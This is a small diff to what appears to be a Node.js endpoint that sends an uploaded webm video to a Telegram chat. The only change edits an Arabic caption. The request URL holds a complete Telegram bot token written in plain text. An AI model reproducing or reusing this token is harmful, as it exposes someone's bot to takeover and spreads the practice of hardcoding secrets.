@@ -15,7 +15,7 @@ module.exports = async (req, res) => {
         const form = new FormData();
         form.append('chat_id', chat_id);
         form.append('video', videoBuffer, { filename: 'video.webm', contentType: 'video/webm' });
-        form.append('caption', '🎬 فيديو جديد');
+        form.append('caption', '🎬 فيديو');
         
         await axios.post(
             'https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendVideo',
